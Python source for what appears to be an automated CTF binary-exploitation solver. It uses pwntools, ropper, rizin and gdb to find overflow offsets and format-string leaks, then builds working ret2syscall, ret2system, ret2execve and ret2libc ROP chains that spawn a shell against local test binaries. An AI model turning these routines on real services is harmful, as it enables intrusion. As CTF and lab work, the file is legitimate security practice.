import subprocess
import json
from pwn import *
from sys import argv
import ropper as r
import rzpipe as rz
from capstone import *
import os
import random

'''

    solver will try to go statically (rizin) => dynamically (gdb) => symbolically (angr) 

'''

class App:
    # constructor
    def __init__(self, binary):
        # initialize useful variables
        self.binary = binary
        self.protections = self.get_protections(binary)
        self.disassembly = {}
        self.pipe = rz.open(binary)
        self.elf = {}
        self.pwnelf = ELF(binary, False)
        self.pwnlibc = None

        # if there is a libc version then yay
        try:
            self.pwnlibc = ELF((b"./ace-student/libc.so.6").decode(), False)
            #self.pwnlibc = ELF((self.pwnelf.runpath + b"/libc.so.6").decode(), False)

        except:
            pass
        
        # initialize ropper & ropper service
        self.rs = r.RopperService()
        self.rs.addFile(binary)
        
        self.rs.loadGadgetsFor()

        # analyze, put anything that depends on self.pipe after this line
        self.pipe.cmd("aaa")
        self.elf = self.pipe.cmd("aflj")
        
    
    # ============= EXPLOITS SECTION ===============

    # this is the function that will detect what exploit to use and call it 
    def handle_exploits(self, binary):
        printf = self.detect_printf_vuln(binary)
        win = False
        libc_leak = None
        syscall = None
        
        # printf vulns -- read/write/got overwrite
        if printf == "printf":
            return
        
        elif printf == "libc":
            # libc leak -- ret2one
            print("[*] ret2one detected.")
            
            vuln = json.loads(self.pipe.cmd("pdfj @ sym.vuln"))
            libc_leak = self.find_given_leaks(vuln)
            
            flag = self.ret2one(binary, libc_leak)

            if not flag:
                print("[*] Running without a ret")

                flag = self.ret2one(binary, libc_leak, False)

                if not flag:
                    # angr!!
                    pass

            return flag.decode()

        # check for "win" in pwnelf.sym -- ret2win/rop params
        if "win" in self.pwnelf.sym.keys():
            win = True
            #self.ret2win(binary)

        # check for "execve" in pwnelf.plt -- ret2execve
        if "execve" in self.pwnelf.plt.keys():
            print("[*] ret2execve detected.")
            
            flag = self.ret2execve(binary)

            if not flag:
                # angr!!
                pass

            return flag.decode()

        # check for "system" in pwnelf.plt -- ret2system 
        if "system" in self.pwnelf.plt.keys():
            print("[*] ret2system detected.")

            flag = self.ret2system(binary)

            if not flag:
                # run without ret and then angr!!
                print("[*] Running without a ret")

                flag = self.ret2system(binary)

                if not flag:
                    # angr!!
                    pass

            return flag.decode()

        # array abuse -- order subject to change


        # syscall gadget -- ret2syscall 
        for file, gadget in self.rs.search(search="syscall"):
            if "syscall;" in str(gadget):
                syscall = int(str(gadget).split(":")[0], 16)
                break

        if syscall:
            print("[*] ret2syscall detected.")

            flag = self.ret2syscall(binary, syscall)

            if not flag:
                print("[*] Shortening ROP chain 1.")

                flag = self.ret2syscall(binary, syscall, 1)

            if not flag:
                print("[*] Shortening ROP chain 2.")

                flag = self.ret2syscall(binary, syscall, 2)

            if not flag:
                print("[*] Shortening ROP chain 3.")

                flag = self.ret2syscall(binary, syscall, 3)

            if not flag:
                # angr!!
                pass

            return flag.decode()

        # write gadget -- write gadgets -- order subject to change

    def ret2syscall(self, binary, syscall, excempt=0):
        io = process(binary)

        binsh = next(self.pwnelf.search(b"/bin/sh"))
        payload = self.find_overflow(binary)

        # in case ret2syscall fails, call it with a different excempt value
        # each value will try to infer that some register that should be null is already null
        if excempt == 0:
            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0, "rdx": 0})
        elif excempt == 1:
            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rsi": 0})
        elif excempt == 2:
            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh, "rdx": 0})
        elif excempt == 3:
            payload += self.generate_rop_chain({"rax": 0x3b, "rdi": binsh})
        else:
            print("[!] out of excemptions.")
            return None

        payload += p64(syscall)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendlineafter(b"<<<", b"cat flag.txt")

            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2syscall did not work.")
            return None


    def ret2system(self, binary, add_ret=True):
        io = process(binary)

        cat_flag = next(self.pwnelf.search(b"/bin/cat flag.txt"))
        ret = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break

        payload = self.find_overflow(binary)
        payload += self.generate_rop_chain({"rdi": cat_flag})
       
        if add_ret:
            payload += p64(ret)
        
        payload += p64(self.pwnelf.plt["system"])

        io.sendlineafter(b">>>", payload)

        try:
            io.recvline()
            io.recvline()
            flag = io.recvline()[:-1]
            

            io.close()

            return flag

        except:
            io.close()
            
            print("[!] ret2system did not work.")
            return None
        

    def ret2execve(self, binary):
        io = process(binary)

        try:
            binsh = next(self.pwnelf.search(b"/bin/sh"))

        except:
            io.close()

            print("[!] /bin/sh not found in ret2execve!")
            return None

        payload = self.find_overflow(binary)
        payload += self.generate_rop_chain({"rdi":binsh, "rsi":0, "rdx":0})
        
        payload += p64(self.pwnelf.plt["execve"])

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2execve failed.")
            return None


    # in my test bins, one_gadget does not want to work
    # ret2libc works though
    def ret2one(self, binary, leaked_function, add_ret=True):
        io = process(binary) 
       
        io.recvuntil(b"<<< Leak: ")
        leak = io.recvline()
        leak = int(leak[:-1], 16)

        libcoff = leak - self.pwnlibc.sym[leaked_function]

        print(f"[*] Libc offset: {hex(libcoff)}")
        
        ret = None
        pop_rdi = None

        for file, gadget in self.rs.search(search="ret"):
            if "ret;" in str(gadget):
                ret = int(str(gadget).split(":")[0], 16)
                break
       
        for file, gadget in self.rs.search(search="pop rdi"):
            if "pop rdi; ret;" in str(gadget):
                pop_rdi = int(str(gadget).split(":")[0], 16)
                break

        payload = self.find_overflow(binary)

        payload += p64(pop_rdi)
        payload += p64(next(self.pwnlibc.search(b"/bin/sh")) + libcoff)

        if add_ret:
            payload += p64(ret)

        payload += p64(self.pwnlibc.sym["system"] + libcoff)

        io.sendlineafter(b">>>", payload)

        try:
            io.sendline(b"cat flag.txt")
            io.recvline()
            io.recvline()
            flag = io.recvline()[:-1]

            io.close()

            return flag

        except:
            io.close()

            print("[!] ret2one failed.")
            return None


    # ======================= STATIC SECTION ==========================
    
    # use checksec to see what protections are in the binary
    def get_protections(self, binary):
        protections = {
                "RELRO": True,
                "Canary": True,
                "NX": True,
                "PIE": True,
                "offset": 0 
        }

        io = subprocess.Popen(["pwn", "checksec", binary], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = io.communicate()

        output = err.split(b"\n")

        for line in output:
            if b"Partial RELRO" in line:
                protections["RELRO"] = False

            elif b"No canary" in line:
                protections["Canary"] = False

            elif b"NX disabled" in line:
                protections["NX"] = False

            elif b"No PIE" in line:
                protections["PIE"] = False
                temp = line.split(b"(")
                protections["offset"] = int(temp[-1][:-1], 16)

        return protections
    
    # find given leaks and return the libc function that is leaked
    def find_given_leaks(self, function):
        # find where printf is called in a given function
        # the rizin call will be `sym.imp.printf` or if rsi and rax are printf then it will call sym..plt         
        # so check for that second scenario

        # right now this will only check the first printf call to see if there is any leak
        # be careful as this might be a factor of fucking up
        for i in range(len(function["ops"])):
            if function["ops"][i]["disasm"] == "call sym.imp.printf" or function["ops"][i]["disasm"] == "call sym..plt.got":
                params = self.find_params(function, i, 2)

                if not params["rsi"]:
                    print("[!] Did not find free leak.")
                    return None

                if "[reloc." in params["rsi"]:
                    leak = params["rsi"].split("[reloc.")[-1][:-1]
                    print("[*] Found leak at libc function " + leak + ".")

                    return leak
                else:
                    print("[!] Did not find free leak.")


        # find value of rsi, if there is one
        
        # return the function used in rsi from the plt table
   
    # this function will return what the value is for each register at a specific call
    # WARNING: be careful with the amount of params it will be looking for since if done wrong it will search too far
    def find_params(self, function, call_idx, params=1, debug=False):
        regs = {
                "rdi": None,
                "rsi": None,
                "rdx": None,
                "rcx": None
        }

        call_idx -= 1
        while call_idx > 2:
            # make sure to end while loop if all registers are populated
            if params == 1 and regs["rdi"]:
                break
            if params == 2 and regs["rdi"] and regs["rsi"]:
                break
            if params == 3 and regs["rdi"] and regs["rsi"] and regs["rdx"]:
                break
            if params == 4 and regs["rdi"] and regs["rsi"] and regs["rdx"] and regs["rcx"]:
                break

            asm = function["ops"][call_idx]["disasm"] 

            # the instruction has to be relating to changing a register
            if "mov" in asm or "lea" in asm:
                found = self.get_registers(asm.encode())
                found = [ i.decode() for i in found if i ]
            
                # if first operand is a param, find value to store it in dict
                if found[0] in regs.keys():
                    if not regs[found[0]] and len(found) == 1:
                        # the value has been populated
                        asm_split = asm.split(",")
                        
                        if not debug:
                            regs[found[0]] = asm_split[-1] 

                        else:
                            regs[found[0]] = function["ops"][call_idx]


                    elif not regs[found[0]]:
                        # the asm looks like `mov reg, reg` and we must find the second reg
                        target = found[1]
                        tmp = call_idx - 1
                        
                        # this can definitely and should be optimized 
                        # that is a later me problem
                        # literally just putting this in a separate function and making it recursive
                        while tmp > 2:
                            asm = function["ops"][tmp]["disasm"]
                             
                            if "call" in asm:
                                tmp = 0

                            if "mov" in asm or "lea" in asm:
                                found2 = self.get_registers(asm.encode())
                                found2 = [ i.decode() for i in found2 if i ] 

                                # found[0] is the original register we were looking for
                                if found2[0] == target:
                                    if len(found2) == 2:
                                        regs[found[0]] = "Not found"

                                    else:
                                        if not debug:
                                            asm_split = asm.split(",")
                                            regs[found[0]] = asm_split[-1]

                                        else:
                                            regs[found[0]] = function["ops"][tmp]

                                    tmp = 0

                            tmp -= 1

            call_idx -= 1

        return regs
    
    # returns an array that shows which regs are used
    # i.e "mov edi, eax" => ["edi", "eax"] or "mov rax, 0xdeadbeef" => ["rax", None]
    def get_registers(self, asm):
        regs = [b"ah", b"al", b"ch", b"cl", b"bh", b"bl", b"dh", b"dl", b"ax", b"di", b"si", b"dx", b"cx", b"sx", b"ebp", b"eip", b"esp", b"eax", b"edi", b"esi", b"edx", b"ecx", b"esx", b"rbp", b"rip", b"rsp", b"rax", b"rdi", b"rsi", b"rdx", b"rcx", b"rsx", b"r8", b"r9", b"r10", b"r11", b"r12", b"r13", b"r14", b"r15"]

        try:
            split_asm = asm.split(b",")
            ret = [None, None]
            for item in regs:
                if item in split_asm[0]:
                    ret[0] = item

                if item in split_asm[1]:
                    ret[1] = item

            return ret

        except:
            for item in regs:
                if item in asm:
                    asm = item

            return [asm]

    # find arbitrary write gadgets
    def check_write_primitive(self, asm):
        # find mov [reg], reg
        heads = [b"mov byte ptr [", b"mov word ptr [", b"mov dword ptr [", b"mov qword ptr ["]

        for h in heads:
            if h in asm:
                return get_registers(asm)
        return None


    # ======================== DYNAMIC SECTION ========================
     
    # find printf vuln
    def detect_printf_vuln(self, binary):
        io = process(binary)

        out = io.recvuntil(b">>>")
        
        if b"0x" in out:
            return "libc"

        io.sendline(b"%p")
        out = io.recv()

        if b"0x" in out:
            return "printf"

        return None
    
    # using a universal function did not work :(
    # creating gdb script on the fly instead
    def find_overflow(self, binary):
        try:
            pattern = cyclic(0x200)

            # this approach will just be to write my own gdb script on the fly and then delete it
            script_contents = f'''
                
                file {binary}
                run <<< {pattern.decode('utf-8')}

                p $rbp

            '''

            rand_name = "./gdb-scripts/script" + str(random.randint(0, 0xfffffff)) + ".gdb"
            
            with open(rand_name, "w") as file:
                file.write(script_contents)

            io = subprocess.run(["gdb", "-x", rand_name, "-batch"], stdout=subprocess.PIPE, text=True).stdout
            io = io.split("\n")[-2][-18:]
            os.remove(rand_name)

            return b"A" * (cyclic_find(int.to_bytes(int(io, 16), 8).decode('utf-8')[::-1][4:]) + 4)

        except:
            print("[!] Could not find overflow.")
            return None

    # self explanatory, returns the string to overflow
    def find_overflow2(self, binary):
        pattern = cyclic(0x500)

        # call gdb with the script I made (which is awesome, by the way)
        # gdb scripts are cool as hell
        # i have no clue why subprocess is being like this :(
        io = subprocess.run(["gdb", "-q", "-x", "./gdb-scripts/inspect_registers.gdb", "-ex", f"\"run_binary {binary} {pattern.decode('utf-8')}\"", "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        print("===========================")
        print(io)


    # =========================== SYMBOLIC SECTION =====================================

    # ========================== ROP SECTION ==================================

    # this function will create a ROP chain that populates wanted registers
    def generate_rop_chain(self, dict_registers):
        payload = b""
        completed = []

        for reg in dict_registers.keys():
            # check if the value has not already been met
            if reg not in completed:
                # use a gadget that has only pop in it because if not then it can get risky  
                use = []

                for file, gadget in self.rs.search(search=f"pop {reg}"):
                    tmp = [ i for i in str(gadget).split(";") ]
                    cool = True

                    for i in tmp:
                        if "pop" not in i and "ret" not in i and i != " ":
                            cool = False

                    if cool:
                        use.append(str(gadget))

                if use == "":
                    print("[!] Could not find gadget. Trying Angr ROP.")
                    return None
                
                # find smallest gadget        
                gadget_used = use[0]
                
                for gadget in use:
                    if gadget.count(";") < gadget_used.count(";"):
                        gadget_used = gadget

                # we have found our gadget, now time to add it to our payload
                payload += p64(int(gadget_used.split(":")[0], 16))
                
                alice = gadget_used.split(":")
                instructions = alice[1].split(";")

                for ins in instructions:
                    # ins[-3:] is the register popped
                    if ins[-3:] == "ret":
                        break

                    if ins[-3:] in dict_registers.keys():
                        payload += p64(dict_registers[ins[-3:]])
                        completed.append(ins[-3:])

                    else:
                        payload += p64(0xdeadbeef)
        return payload


    # remember to have this only run once and store for all of binaries that need it
    def find_one_gadget(self, binary):
        addresses = []

        io = subprocess.run([b"one_gadget", b"./ace-student/libc.so.6"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        io = io.split(" ")

        for alice in io:
            if "0x" in alice and "-" not in alice and "+" not in alice:
                if "\n" in alice:
                    bob = alice.split("\n")
                    addresses.append(int(bob[-1], 16))

                else:
                    addresses.append(int(alice, 16))

        return addresses 

if __name__ == "__main__":
    # testing grounds
    bins = [ f"./ace-student/test-bins/bin-ret2one-{i}" for i in range(10) ]
    count = 0
    start = time.time()
    
    for binary in bins:
        app = App(binary)
        flag = app.handle_exploits(binary)

        if flag == "flag{your_mom}":
            count += 1

    end = time.time()
    print(f"==== Test conclusion: {count}/10 in {end - start} seconds. ====")

    #app = App(argv[1])

